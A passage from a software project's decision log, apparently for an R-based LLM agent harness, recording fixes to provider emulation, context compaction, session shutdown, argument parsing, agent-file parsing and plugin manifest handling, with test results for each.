   distribution, a value the model never stated. Any other sum is still rescaled.
4. **Stop reasons and failure classes.** A reply that ends with any stop reason other than
   `stop` (`length`, `refusal`, ...) is `gptr_error_s1_response` and is never retried. Report 04
   section 2.12: refusals and truncated output raise without corrective retries. The plan parsed
   whatever text arrived. A failed or aborted stream is classified by the cause in its `error`
   event (`s1_emu_failed()`, review round 1; the plan took the class from the status alone, so
   every failure without a status became a retried `s1_connection`):
   - a `timeout*` or `network` class is `s1_connection` (retried), as in Task 4's
     `s1_transport_outcome()`;
   - otherwise a known HTTP status gives `s1_status_class(status)`;
   - an abort, a failure found locally (`invalid_argument`, `invalid_spec`, `internal`, an
     adapter that could not build the request) or an event without a class is `s1_response`,
     never retried;
   - P04's never-retried classes (`redirect`, `spend_cap`, `retry_after`; contract 2.2, IC-64)
     keep their status class but are not retried.

   The event's class becomes the condition's `error_type`.
5. **Preflight first (07 sections 2.1 and 5).** `s1_emu_ready(model, safety)` runs before the
   notice, the schema, any state serialisation or request:
   - it refuses a decision-only (classifier) model with `gptr_error_not_available`;
   - it then runs P05's pure preflight (`s1_preflight()`) on the model's registered provider.

   `provider_stream()` still preflights each request. This earlier check makes a refused route,
   such as an Ollama chat model under the local-only policy, fail before any state is serialised.
   `s1_emulate_classify()` reads `opts$safety` and `opts$signal` by exact name and passes them to
   the stream. `s1_emulate()` keeps contract 7.13's signature, so it uses the local-only default.
6. **Unknown usage stays NA (D-076).** Unreported token counts are NA (`s1_count()`), not
   `%||% 0`, and message fields are read with `[[`.
7. **The notice on both entry points (IC-19).** `s1_emulate_classify()` shows the same
   once-per-process uncalibrated notice as `s1_emulate()`, so the `s1-emulate` adapter is never
   silent either. The plan showed it only from `s1_emulate()`.

Review round 1 added three more:

8. **No session id.** The plan's context had `session_id = ""`. For HTTP adapters
   `provider_stream()` copies it into the request spec, and P04's `reactor_http()` refuses an
   empty id, so every emulated request to a real chat model ended as a local error before
   anything was sent. An emulated request belongs to no session: the context keeps the field
   with the value NULL (P04 then logs it under "nosession", and the OpenRouter session header is
   left out).
9. **Requests are let go of on interrupt (07 section 5).** For HTTP transports
   `provider_stream()` also installs an abort-watch reactor task that ends only with the stream.
   `s1_round()`'s interrupt cleanup cancels the transfer id alone, so the watch task stayed for
   the rest of the process, holding the serialised state. The plan assumed the returned id was
   enough to cancel. Each emulated request now gets its own signal (`s1_emu_signal()`, active
   bindings that also read the caller's `opts$signal` but never write to it, since that signal
   may be shared) and is listed until it reports. `s1_emulate()` and `s1_emulate_classify()`
   abort the requests still open on exit (`s1_emu_release()`), so the next pump ends each stream
   and its watch task.
10. **A refused reply's usage counts (IC-74).** A reply that completed but was refused (a
    `length` or `refusal` stop, a malformed body) was charged. Its failure outcome now carries
    the reported `usage`, and Task 4's `s1_dispatch()` adds the usage of any failed outcome that
    carries one (only emulation does). Not done: making the call's usage NA whenever a failed
    request has no usage. A transport failure has no reply to report usage; a NA rule there
    would change Task 4's documented sums for every adapter (a TypeSafe 529 would make every
    call's tokens and cost unknown), and `s1_drive()` keeps only each element's last round, so it
    could not be complete either. Forward note for Task 8: when it logs System 1 usage
    (`s1_usage_log()`), it reads the call's sums, which now include refused emulated replies but
    not earlier failed rounds or failed transfers.

For Task 9: `s1_request()` hands the `s1-emulate` adapter's `classify$run` the classifier record
it resolved, whose api is `s1-emulate`. `provider_stream()` refuses that api (no stream
functions), and both it and `s1_emu_ready()` refuse a classifier type. Task 9 must give `run()`
the chat model if that adapter is to answer through `s1_request()`. Task 8's `s1_answers()` calls
`s1_emulate()` directly and is unaffected.

Validation: `progress/P13.md`, Task 6. `^s1-emulate$`:

- red `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 0 ]`, every failure a missing function or binding;
- green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 88 ]`: the plan's tests 33 (its 32 plus 1), 55 in six
  new tests;
- with the plan-literal functions swapped in, 8 of 11 tests fail;
- review round 1 (items 4 and 8 to 10): five new tests, two on P01's mock server. Red
  `[ FAIL 24 | WARN 0 | SKIP 0 | PASS 118 ]` (0 requests reached the server, failures were
  retried `s1_connection`, refused replies counted 0 tokens); with only item 8 fixed, the
  interrupt test showed the leftover watch task. Final green
  `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 153 ]`; without `s1_emu_release()` the interrupt test fails.

Lint is clean.

## D-083 - P07 harness state: objects stay oldest first across reassignment and iterative compaction, so the checkpoint's object budget drops the oldest; snapshot rows without a class (unforced promises, active bindings) give no shape; the user-message list holds its whole budget, decisions keep the newest, the state always has its seven fields, only a complete plan block counts and a call with an error result lists no file (2026-10-04)

P07 Task 12 (`R/prompt-compact.R`). `compact_state_empty()`, `compact_objects()`, the user and
decision rules of `extract_state()` and the plan's 7 tests (28 expectations) are unchanged; items
3-7 (review round 1) change `compact_assigned_names()`, `compact_user_messages()`, the decisions
of `compact_checkpoint_body()`, the file, skill and plan rules of `extract_state()` and
`compact_state_merge()`.

1. **Objects stay oldest first (the plan's own rule: "`<r_objects>` ..., oldest dropped first
   beyond 800 tokens").** `compact_objects()` drops lines from the front, so the object list must
   run from the oldest assignment to the newest. The plan's code broke that twice:
   `compact_state_merge()` put the previous checkpoint's objects after the new ones, and
   `extract_state()` left an object assigned again at the place of its first assignment. After
   one compaction the budget therefore dropped the newest objects first (test: old `p`, `q`,
   then `r = 3; t = 4` and `q = 2; r = 5` gave the order `r`, `t`, `q`, `p` and a one-line budget
   kept `p = 1`). New `compact_object_set()` moves a name to the end when it is assigned again;
   the merge lays the previous state's objects first and the new ones over them. The order is
   now `p`, `t`, `q`, `r`, and the budget keeps `r = 5`. An object assigned again still shows its
   newest code.
2. **Snapshot rows without a class give no shape (P09 `env_snapshot()`, contract 7.9).** P09
   never forces a promise or calls an active binding, so those rows have `class` and `shape`
   `NA`. The plan pasted them into `NA NA` and a real class with an `NA` shape into
   `data.frame NA`. `compact_shapes()` now leaves out rows without a class (the object shows
   `?`) and reads an `NA` shape as empty.

3. **The user-message list holds its whole budget (architecture 12.2: "compaction checkpoint ...
   user messages 2,000"; review round 1).** The plan's `compact_user_messages()` always kept the
   first and the newest message in full and budgeted only the messages between them, so the
   test's two pasted prompts of 5,000 words gave a 13,770-token list, and the merge carries the
   first message into every later checkpoint (the IC-71 floor check assumes a checkpoint of about
   634 tokens). The whole list, line numbers and the omission line included, now stays within
   the budget: when the first and the newest do not fit together, a message within half the
   budget stays whole and the other is cut to the rest, else each is cut to half. New
   `compact_clip()` keeps the head of a text and ends it with P07's `block_truncated` notice; it
   cuts by characters, because `prompt_truncate()` keeps whole lines and would drop a one-line
   message entirely. A list that fits is unchanged.
4. **Decisions keep the newest (review round 1).** The plan cut the `- ` list with
   `prompt_truncate()`, which keeps the oldest lines; the merge keeps every decision across
   compactions, so after about 19 one-line notes no later decision reached any checkpoint (and a
   single note over 300 tokens left only the notice). New `compact_decisions()` keeps the newest
   decisions that fit in 300 tokens after a `(<n> earlier decisions omitted)` line, as the
   objects drop the oldest first; the newest is cut, not dropped, when it alone exceeds the
   budget. A list that fits is unchanged.
5. **The state always has its seven fields (contract 7.7).** `a$plan = a$plan %||% b$plan`
   removed `plan` when both were `NULL`, so a state merged with an earlier compaction had six
   fields. The merge now assigns `a["plan"] = list(...)`.
6. **Only a complete `<proposed_plan>` block is the plan.** With an opening tag and no closing
   tag the plan's `sub()` matched nothing and returned the whole assistant text, which then rode
   unbudgeted in every later checkpoint. The plan is now taken only from text holding a complete
   block; such text no longer replaces an earlier complete plan.
7. **A call whose result is an error lists no file or skill.** The plan recorded `read`,
   `write` and `edit` paths from the calls alone (Pi's cumulative tracking), so a denied or failed
   edit was listed as modified, while the model is told not to repeat that list. Calls are now
   held in transcript order and dropped when the result with the same `tool_call_id` is an error
   (P06 closes every failed, denied, blocked and unexecuted call with an error result). A call
   without a result still counts, as in the plan's test. Within one `r` call a name assigned
   twice now also takes the newest place (`compact_assigned_names()` uses
   `compact_object_set()`, item 1).

Validation: `progress/P07.md`, Task 12. Three tests (13 expectations) were added, including a
round trip of a compaction state through P06's session-file JSON shape. On the plan literal 4
expectations of the added tests fail (`dev/.validation/P07/task12-plan-literal.log`). Review
round 1 added five tests and two expectations to the item-1 test (29 expectations); on the
round's starting code 18 fail (`task12-fix1-red.log`). Final `^prompt-compact$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 88 ]`.

## D-084 - P17 template arguments: command arguments split on the command pattern's ASCII whitespace in every locale, in linear time (2026-10-04)

P17 Task 5 (`R/skill-templates.R`). `template_re`, `template_substitute()`, `template_expand()`,
`template_expand_input()`, the fixture of 67 Pi assertions and the plan's 4 tests (77
expectations) are the plan's literal ones. Only `template_args_parse()` (Pi `parseCommandArgs()`)
changed; its signature and its results on every UTF-8 input of ASCII whitespace, quotes and other
characters are unchanged (20,000 random inputs compared with the plan-literal function in a UTF-8
and a C locale: 0 differences).

1. **Whitespace is the same in every locale.** The plan tested each character with
   `grepl("^[[:space:]]$", ch)`. TRE answers that with the C library's `iswspace()`, so U+1680,
   U+2000-U+200A, U+2028 and U+3000 (the ideographic space of CJK input) split arguments in a
   UTF-8 locale but not under `LC_ALL=C`, which the CI matrix runs (architecture 6.6). The command
   pattern of the same file, `^/([^\s]+)(?:\s+([\s\S]*))?$` (PCRE, no UCP), treats them as
   ordinary characters in both. Whitespace is now the fixed set that pattern's `\s` matches
   (space, tab, newline, vertical tab, form feed, carriage return), which is also report 05's
   verified prototype (`grepl("^\\s$", ch, perl = TRUE)`). `/review x<U+3000>y` gives one
   argument in every locale.
2. **Linear cost.** The plan appended each character with `paste0(cur, ch)`, which is quadratic in
   an argument's length: one 100,000-character argument (a pasted log after `/explain`) took 11 s
   alone and 22 s in the test. Each character is now tagged with the number of its argument and
   every argument is joined once (0.03 s).
3. **Input is made UTF-8 before it is joined** (review round 1). The plan wrote
   `as_utf8(paste(x, collapse = " "))`. In a locale that is neither UTF-8 nor latin1, `paste()`
   first translates a latin1-marked string to the native encoding, so `caf\xe9` became the text
   `caf<e9>` before `as_utf8()` saw it, and `template_expand("$1", l1)` gave other bytes than the
   vector form `template_expand("$1", c(l1, "y"))`. The parser now calls
   `paste(as_utf8(x), collapse = " ")`, the order `template_substitute()` already uses.

Three regression tests appended to `tests/testthat/test-skill-templates.R` after the plan's 4 lock
the three items. The first two fail against the plan-literal code
(`[ FAIL 9 | WARN 0 | SKIP 0 | PASS 81 ]`; the time limit is 5 s, 00-conventions section 7, and
the plan-literal parser takes 22 s), the third under `LC_CTYPE=C` with the plan's join order
(`[ FAIL 2 | WARN 0 | SKIP 0 | PASS 91 ]`). Every later P17 count for this file is 16 higher
(IC-74).

Validation: `progress/P17.md`, Task 5. `^skill-templates$`: red
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 0 ]`, plan-literal green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 77 ]`, final `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 93 ]` in a UTF-8
locale and under `LC_ALL=C`; lint clean.

## D-085 - FIX-1 GC-time session shutdown: the finalizer still releases the lock and leaves the live index at once, but its session_shutdown (hooks, record drop) waits for the next safe point; registry loops tolerate records removed under them (2026-10-04)

Coordinator-scheduled follow-up FIX-1 (maintainer-requested), in P06's `R/session-live.R` and
`R/session-object.R` and P02's `R/ext-registry.R`, `R/ext-events.R`, `R/ext-load.R` and
`R/ext-check.R`. Plan literal (P06 Task 3 `session_finalizer()`; P02 Task 8 `ev_dispatch()`): the
finalizer of a collected shell called `ev_dispatch("session_shutdown", reason = "gc")`, which
ran every `session_shutdown` hook and, on exit, `registry_session_drop()`. R runs that finalizer
at whatever point a collection happens, so hooks ran and records vanished in the middle of
unrelated code: `registry_recs()` read an id snapshot and then `get()` each id, and failed with
"object 'rNN' not found" (the flaky P07 tests, `progress/P07.md` Tasks 5-8; a forced `gc()` gave
6 errors on clean HEAD). The same pattern was in `registry_session_drop()`, `ext_unload()`,
`gptr_reload()`, `check_in_scratch()` and `check_factory()`.

1. **The finalizer only does what is safe at any allocation.** It removes the shell's
   `the$live` entry (every reader uses `get0()`, so a loop over the live index skips it),
   releases the session file's lock (a file only the dead shell held; now inside `tryCatch()`)
   and queues the notification with P02's new `ev_defer()`, which adds one uniquely keyed binding
   to the registry's `deferred` environment. The lock release and the live-index removal stay
   immediate on purpose: architecture 5.1 says the finalizer removes the entry and the lock,
   P06's test "an unreferenced session is finalised and its lock removed" checks it right after
   `gc()`, a deferred release could remove the lock of a new shell attached to the same file in
   between, and a dead shell left in the index would be returned by `session_by_id()` and
   `live_all()` (the coordinator's preferred design deferred the lock too; this keeps it at
   once, which is sooner than "the next safe point").
2. **The notification is dispatched at the next safe point**, by `ev_drain()`: at the start of
   `ev_dispatch()`, `registry_get()`, `registry_all()`, `registry_names()`, `gptr_registry()`,
   `ext_load()`, `ext_activate()`, `ext_unload()`, `gptr_reload()` and
   `registry_session_drop()` (P02's new `registry_enter()`/`registry_leave()`), at the start of
   `session_new()` and in `session_attach()` after its `gc()` re-check. It still carries reason
   `"gc"`, the session id, `turn` and the time of collection, and the session's rank-0 records
   are still dropped after its handlers ran (IC-69).
3. **A drain never runs under registry work.** `registry_enter()` counts registry work in
   progress (`reg$busy`); `ev_drain()` does nothing while the count is above zero, so no drain
   runs inside a dispatch's hook loop, a factory run or any P02 loop, and nothing while a drain
   runs (`reg$draining`): a session collected, or a shutdown deferred, by a handler during a
   drain is taken by the same drain afterwards, never dispatched nested. Each item is removed
   before its dispatch (an interrupted drain never repeats one) and a failing dispatch becomes a
   diagnostic.
4. **A reused id gets the old shutdown first.** `live_new()` calls `ev_drain(session = id)`
   before it registers a shell under an id: the shutdown still queued for a collected shell with
   that id (a resumed or attached session) is dispatched then, even under registry work, so it
   never reaches the new shell's listeners nor drops the new shell's records. This is the one
   drain that may run under registry work; the loops of item 6 tolerate it.
5. **Unload and exit.** `live_unload()` drains (forced) before and after the `unload`
   shutdowns of the live sessions. At process exit the session finalizers (`onexit = TRUE`) only
   queue, so P06's `on_load()` registers an exit finalizer on `the$live` (`live_exit()`): it is
   registered at load, R runs exit finalizers newest first, so it runs after every session's and
   dispatches what they queued (forced). A re-run load that replaced `the$live` makes the old
   one's finalizer do nothing.
6. **Loops tolerate a record removed under them.** `registry_recs()` reads with
   `mget(ifnotfound = list(NULL))` and drops the missing ids (unnamed list, as before);
   `registry_session_drop()`, `ext_unload()`, `gptr_reload()`, `check_in_scratch()` (records
   and kinds) and `check_factory()` use `get0()` and skip a missing entry.
7. **State.** No new field of `the` (contract 7.0 unchanged): the queue and counters are fields
   of the P02 registry environment (`deferred`, `deferred_seq`, `busy`, `draining`, set by
   `registry_new()`). As before, a GC-time shutdown goes to the registry that is current when the
   session is collected.

Not changed: a direct `ev_dispatch("session_shutdown", ..., session = id)` (P02's tests, `/exit`,
`live_unload()`) still dispatches and drops at once. An idle R session dispatches a collected
session's shutdown at its next gptr call that reaches a safe point; P04's reactor pump is not one.
P07's `gc()` workaround in `tests/testthat/test-prompt-sections.R` (and `test-prompt-cache.R`,
`test-prompt-compact.R`) is no longer needed but is left to the P07 lane.

Validation: `progress/fixes.md`, Task FIX-1.

## D-086 - P17 agent files: a sequence or a map where a scalar mode or turn limit belongs is dropped instead of throwing, a turn limit must be a positive whole number, `permissionMode` applies whenever `mode` is not a permission mode, and a `tools` value that gives no names is a diagnostic (2026-10-04)

P17 Task 7 (`R/subagent-defs.R`). `tool_name_table`, `tool_name_map()`, `agent_mode()`,
`agent_parse_cached()`, `agent_untrust()`, `agent_files()` and the plan's 4 tests (31
expectations) are the plan's literal ones; `agent_file_parse()` changed in four places and
`agent_dir_specs()` reads the plugin name as `p[["name"]]` (the exact access the plan asks for
frontmatter fields; same result for a resolved plugin).

1. **No error from a sequence as `mode` or `permissionMode`.** The plan tested
   `is.null(backend) && is.character(mode_raw) && mode_raw %in% c("inline", "worker", "cli")`.
   For `mode: [inline, plan]` the last operand has length 2, and R (>= 4.3) stops with
   `'length = 2' in coercion to 'logical(1)'`, so one malformed agent file threw out of
   `agent_file_parse()` (and later out of discovery), against contract 11.13 ("failures are
   diagnostics, never errors"). The test now requires a single string; such a value is dropped
   like any other unknown mode (backend `auto`; the mode comes from `permissionMode` if that is
   a permission mode, item 3, else `NULL`, so the child keeps its parent's mode, 04 section 6.1).
2. **No error from a sequence or map as the turn limit, and only whole numbers.** The plan
   coerced with `suppressWarnings(as.integer(m[["max_turns"]] %||% m[["maxTurns"]]))`, which throws
   `'list' object cannot be coerced to type 'integer'` for `max_turns: {a: [1, 2]}` or
   `maxTurns: [[1, 2]]`, and silently turned `2.7` into 2, `true` into 1 and `{a: 1}` into 1. The
   new helper `agent_max_turns()` accepts one number or its text (`12`, `"12"`, `3.0`) that is a
   whole number from 1 to `.Machine$integer.max`; anything else is `NULL` (the default limit),
   never an error.
3. **`permissionMode` applies whenever `mode` is not a permission mode** (Task 7 review). The
   plan read `m[["mode"]] %||% m[["permissionMode"]]` and went back to `permissionMode` only when
   `mode` was Pi's backend value and `backend` was absent. So `backend: worker`, `mode: inline`,
   `permissionMode: plan` (and `mode: bogus` or `mode: [inline, plan]` next to
   `permissionMode: plan`) lost the declared `plan` without a diagnostic, and the child ran at its
   parent's looser mode. A Pi execution mode is never a permission mode, so the mode is now
   `agent_mode(mode)` unless `mode` is Pi's backend value, falling back to
   `agent_mode(permissionMode)`. gptr's own `mode` still wins when both are permission modes
   (`mode: auto`, `permissionMode: plan` gives `auto`, as in the plan).
4. **A `tools` value that gives no names is a diagnostic** (Task 7 review). A present `tools`
   for which `fm_chr_list()` gives `NULL` (a nested sequence such as `[[Read, Grep]]`, `[]` or
   `""`) was dropped silently, so the agent quietly got its preset's tools. It is still ignored
   (`tools` stays `NULL`, as in the plan), now with the `builtin:agents` diagnostic
   "tools must be a comma list or an array of names; ignored", like the plan's "unknown tools
   ignored". How P19 scopes a child whose declared tools all map to nothing is left to P19.

Seven regression tests follow the plan's 4 (46 expectations): four under
`# Task 7 adaptations (D-086)` (27, including the Claude `permissionMode` mapping that the plan's
tests reach only through `plan`) and three under `# Task 7 review fixes (D-086)` (19: items 3 and
4, and that documentation files give no diagnostic, which the plan's Produces line states but its
tests did not check). Against the plan-literal source the first four give
`[ FAIL 9 | WARN 0 | SKIP 0 | PASS 43 ]` (the four `expect_no_error()` checks, the two errors
that follow them, and `2.7`, `true` and `{a: 1}`); against the pre-review source the last three
give `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 72 ]` (three lost `plan` modes, two missing `tools`
diagnostics), and a mutant that diagnoses before the documentation early return fails the
documentation test twice. Every later P17 count for this file is 46 higher (IC-74):
subagent-defs 57 -> 103 (Task 8; Task 12's `skill|subagent-defs` 260 -> 306), and acceptance
row 1 rises by 46 on top of D-072, D-074 and D-084.

Validation: `progress/P17.md`, Task 7. `^subagent-defs$`: red
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 0 ]`, plan-literal green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 31 ]`, final `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 77 ]`; lint
clean.

## D-087 - P07 compaction runs: compaction events carry the contract 4.5 envelope; inside a run the checkpoint request uses the run's model and protected safety record, and an overflow compaction of a router session asks the router; a request that cannot start, or an empty reply, still leaves a harness-state checkpoint; malformed hook and compactor results are diagnostics, and the harness's details fields win; reason and focus are validated; the tool additions and section patches a compaction drops are announced again after it; an aborted run records no compaction; the usage of every checkpoint request is kept; an unknown token count stays unknown; the continuation carries the latest request's images (2026-10-04)

P07 Task 13 (`R/prompt-compact.R`). `compact_last()`, `compact_request_text()`,
`compact_header()`, `compact_skills()`, `builtin_compaction()` and its `on_load()`, the
threshold, 20% growth and cold rules, the cold-as-threshold memo and the plan's 13 tests (55
expectations) are the plan's. The changes below come from contract 4.5 and 10.2, IC-74 and the
real P05/P06 interfaces, and each has a test.

1. **Envelope.** The plan dispatched `session_before_compact` and `session_compact` as bare
   payload lists, so handlers saw only `type`, `session` and `ts`. Contract 4.5 (and 10.4,
   "payload fields are in addition to type, session, run, agent, turn, ts") requires the whole
   envelope; Task 11's review made the same correction to `cache_break`. New `compact_event()`
   builds both events with `ev_new()` (`run` and `agent` of the session's current run, else NULL
   and "main"; `turn`).
2. **The run's model and safety record (IC-69, IC-74).** P06's `run_compact_check()` routes a
   router session for "compaction" (`run_route()`) at a request boundary before it calls
   `compact.run`, and P06's `run_target()` resolves models that P05's `model_resolve()` cannot (a
   provider registered for the session only). Inside a run, once the run's model is resolved,
   `compact_target()` therefore uses it, so for a `threshold` or `cold` compaction the router is
   not asked twice. P06's recovery from an overflow error (`run_response_error()`) calls
   `compact.run(s, "overflow")` without routing, and there `run$model` is the model whose request
   just overflowed. So an `overflow` compaction of a router session asks `router.call` with
   reason "compaction" itself, as the plan did on every path (contract 10.2 kind `router`: the
   router is called at compaction), and falls back to the run's model when the router gives none
   that resolves. After a silent overflow, which P06 routes at the boundary, this asks the router
   a second time. Without a resolved run model (outside a run, or at a run's first request
   boundary, where `run_compact_check()` runs before `run_target()`), a router session asks
   `router.call` and any other session resolves its model through the catalog, as the plan did:
   a provider registered for the session only is then not found, so `compact.should` is `FALSE`
   at that first boundary and such sessions compact between tool rounds and on overflow. The
   checkpoint request also carries the run's protected safety record (`run$opts$safety`) to
   `provider_stream()`, so P05's preflight checks the effective origin against the same
   local-only setting as the run's own requests. The plan passed none, which P05 reads as
   local-only.
3. **A request that cannot start (the plan: "an error reply is not retried and the checkpoint
   then carries the harness state alone").** `provider_stream()` signals a refusal (preflight,
   missing key, disabled provider) before anything starts. In the plan that error escaped the
   compactor, no fallback applied, and `compact_run()` failed with `gptr_error_internal`, so an
   overflow could not be recovered. It is now a diagnostic and gives no reply, as an error reply
   does; nothing is sent.
4. **An empty reply is asked again once,** like a reply that calls a tool or stops on length. The
   plan accepted it as an empty `<summary>`.
5. **The continuation line is the plan's (withdrawn in review round 2).** The implementation
   cut the latest request in `Continue from the checkpoint. The latest request was: <text>` to
   2,000 tokens with Task 12's `compact_clip()`, reading architecture 12.2's "user messages
   2,000" as its budget. That budget belongs to the checkpoint's `<user_messages>` list, which is
   clipped there; nothing bounds the continuation line, and the plan and G4's
   `make_compaction_entry()` repeat the request whole. With `keep_recent = 0`, and P06 appending
   a new prompt before `run_compact_check()`, the line is the only copy of a prompt the model has
   not answered yet, so the cut silently dropped the user's input past about 2,000 tokens (only
   the model saw the truncation notice). The line is the plan's again. A request too large to
   fit after a compaction surfaces as `context_overflow` after the one compact-and-retry
   (INFRA-26), and the 20% growth rule (IC-71) keeps a threshold compaction from looping. Not a
   deviation any more; kept as the record of the reverted change.
6. **Results.** A `session_before_compact` result without content blocks is a diagnostic
   (`malformed_result`) and the compactor runs; the plan aborted the whole compaction. A plugin
   compactor's result without blocks counts as a failure and falls back to `checkpoint` (contract
   10.2), as an error does. The harness's `reason`, `strategy` and `tokens_after` replace a
   result's `details` fields of the same name; the plan concatenated the two lists, so a
   result's own `reason` shadowed the harness's.
7. **should.** A plugin's bare `TRUE` carries reason `"threshold"` (the service returns
   `lgl(1)` with a reason), and an unknown token count or idle time (`NA`) is no evidence. The
   plan reached `if (NA)` and fell back to `FALSE` through a diagnostic.
8. **Arguments.** `compact_run()` refuses a `reason` other than the four of contract 10.4 and a
   `focus` that is not a string (`gptr_error_invalid_argument`). Review round 3: it now uses the
   value P01's `check_choice()` returns, so the whole vector of the four reads as `"threshold"`
   (P01's `match.arg()`-like convention); before, the check passed it and the vector itself was
   sent in `session_before_compact` and stored as `details$reason`.
9. Without a test of its own (the plan's tests cover the same output): the `<mode>` block comes
   from the registered `mode` context block (P07's text when none renders), so a replaced mode
   block is deduplicated against the compaction. A dropped project block is hashed with Task 5's
   `context_text_hash()`, the stored-form hash its update check compares with; for text without
   secrets this equals the plan's `hash_sha256()`.
10. **The operator state a compaction drops is announced again (review round 1).** Task 8 tells
    the model of tools added mid-session (`tool_change`: declarations by value, or `gptr$` member
    lines) and of section patches (`section_patch`) only through operator messages; the frozen
    tool array and system prompt never change. With `keep_recent = 0` the compaction drops them
    from the projection, while `prompt_tools_known()` still counts them, so the model lost the
    tools for the rest of the session (adding them again announced nothing) and a patched section
    silently reverted. The checkpoint request's `request_build()` also flushed a queued change
    into the transcript just before the compaction dropped it. `compact_run()` now appends, right
    after the compaction entry and for every compactor and hook result,
    `compact_operator_state()` of the path as it stands after the compactor ran (flushed changes
    included): one `tool_change` with every declaration sent by value (newest per name), one
    with the newest member line per registry key, and the newest patch per section (a removal
    stays a removal). An item whose newest message lies in the entries a result keeps
    (`first_kept_entry_id`, a plugin's `keep_recent`) is still visible there and left out. Changes
    still queued (a hook result sends no request) follow at the next request, after them. The entries are appended rather than queued so that they survive a save
    and resume before the next request; a compaction runs at a request boundary, so nothing
    else sits between it and them. `tokens_after` counts them. The plan re-announced nothing.
11. **A malformed result state (review round 1).** A hook or plugin result whose `state` is not a
    list was stored as the compaction's state, and every later compaction of the branch then
    failed in `compact_state_merge()`. It is now a `malformed_state` diagnostic and replaced by
    `extract_state()` of the path, and the merge ignores a stored state that is not a list.
12. **An aborted run (review round 1).** The nested wait for the checkpoint reply now also ends
    when the session's run is aborted or settles (another reactor callback: `run_abort()`, a
    budget or timer stop, a hook's `ctx$abort()`); `compact_ask_once()`'s exit handler then
    cancels the transfer, the request is not retried, and `compact_run()` records nothing. The
    plan waited for the whole reply and appended a compaction for the aborted run. Review round
    3: P06's `run_abort()` settles the run, and `run_settle()` clears the live record's `run`, so
    the round-1 check, which read `session_live(s)$run` again after the wait, found no run and
    `compact_run()` still appended a harness-state checkpoint, its operator messages and
    `session_compact` to the aborted session (the round-1 test only set `run$signal$aborted` on
    a stand-in run). `compact_run()` and `compact_checkpoint()` now read the run once when they
    start (`compact_live_run()`) and pass it to `compact_ask()`/`compact_ask_once()`; every
    halted check tests that run (`compact_run_halted()`). The test aborts a real `session_run()`
    with P06's `run_abort(r, "user")` while the checkpoint reply is awaited.
13. **Usage of every attempt (review round 1, contract 10.2 `usage`).** The compactor's `usage`
    held only the final attempt's usage; a rejected first reply (a tool call, a `length` stop or
    an empty reply) was billed but dropped. `compact_ask()` now returns the sum of every reply's
    usage (`compact_usage_sum()`: a single record unchanged, several summed field by field, an
    unknown count or cost makes the sum unknown, IC-74). Review round 3: a reply without a usage
    record was left out of the sum, so a rejected reply that reported nothing gave the known
    total of the other reply; it now counts as unknown usage (P05's `usage_as()`: absent observed
    usage is not a zero-token request), so the sum is unknown. A single reply without a record
    still leaves the compaction without `usage`.
14. **An unknown token count (review round 2, IC-74).** When no model resolves, the plan's
    `compact_run()` kept the context's token count at 0, sent that in `session_before_compact`
    and `session_compact` and stored it as the `tokens_before` of a hook-supplied result. It is
    now `NA` in both events, and the entry omits `tokens_before` (contract 4.6 `tokensBefore` is
    a number; `json_encode()` would write `NA` as the string "NA"). A compactor given an unknown
    count (`ctx$input$tokens` `NA`) estimates the checkpoint's `tokens_before` attribute with the
    model it resolved instead of writing "NA".
15. **The latest request's images (review round 3).** The plan's continuation line
    (`Continue from the checkpoint. The latest request was: <text>`) repeats the request's text
    only. With `keep_recent = 0`, and P06 appending a new prompt before `run_compact_check()`, a
    threshold compaction at that boundary left the model a prompt such as "what is in this
    image?" without the image (the retried request had no image block). The compaction's blocks
    now carry the image blocks of the latest request right before the continuation line
    (`compact_request_images()`: walking back from the leaf, the images of the user's messages up
    to and including the newest one with text, the request the line names; a compaction entry
    on the way contributes the images it carried, so a later compaction keeps them once; a
    steering relay is text only). The images are the user's blocks as sent (P06's image elision
    by id still applies to every copy), the session file keeps them with the compaction entry,
    and `tokens_after` counts the result's images with the request estimator's image rule. An
    earlier request's images are not repeated; the model's summary describes them.

Validation: `progress/P07.md`, Task 13. Twenty-one tests (133 expectations) were added: ten by
the implementation (59; review round 2 replaced its continuation-line test, 3 expectations, with
one of 7 that asserts the request survives whole), six (35) by review round 1 (review round 3
rewrote its abort test on a real run, 3 -> 9 expectations), one (8) by review round 2 and four
(21) by review round 3. On the plan literal the implementation's ten failed 19 and the plan's 55
passed (`dev/.validation/P07/task13-plan-literal.log`; 2 of those failures were the withdrawn
item 5); on the pre-review source the six round-1 tests fail 19 (`task13-fix1-red-final.log`).
Round 2 red `[ FAIL 7 | WARN 0 | SKIP 0 | PASS 240 ]` (`task13-fix2-red.log`); round 3 red
`[ FAIL 10 | WARN 0 | SKIP 0 | PASS 260 ]` (`task13-fix3-red.log`). Final `^prompt-compact$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 276 ]`.

## D-088 - P17 plugin resolution: a manifest that is not a JSON object is a diagnostic, an installed Claude plugin uses its newest install path that exists and malformed entries are skipped, a `~` path expands with `user_home()`, and an installed Claude plugin without a manifest name is named by its installed key (2026-10-04)

P17 Task 9 (`R/ext-plugins.R`). `plugin_api_req()`, `plugin_from_dir()`,
`plugin_from_package()` and the resolution order of `plugin_resolve()` are the plan's literal
ones, and the plan's 4 tests (15 expectations) are appended byte for byte. Four places changed:

1. **A manifest that is not a JSON object is a diagnostic.** The plan's `plugin_manifest_read()`
   returned whatever `json_decode()` gave. A `plugin.json` holding valid JSON that is not an
   object (`"hello"`, `42`, `true`) then made `man[["name"]]` in `plugin_from_dir()` stop with
   `subscript out of bounds`, so `plugin_resolve()` threw a base R error. That breaks the plan's
   rule ("an invalid manifest is a registry diagnostic, never an error") and contract 7.17's
   result (`list(...)` or `gptr_error_invalid_argument`). An array (`[1, 2]`) became the
   manifest, and `null` was dropped without a diagnostic. Now everything other than an object is
   the `user`/`plugin`/`manifest` diagnostic "<file>: the manifest is not a JSON object" and gives
   `NULL`, the same as invalid JSON.
2. **Installed Claude plugins: the newest install path that exists, and no error from a bad
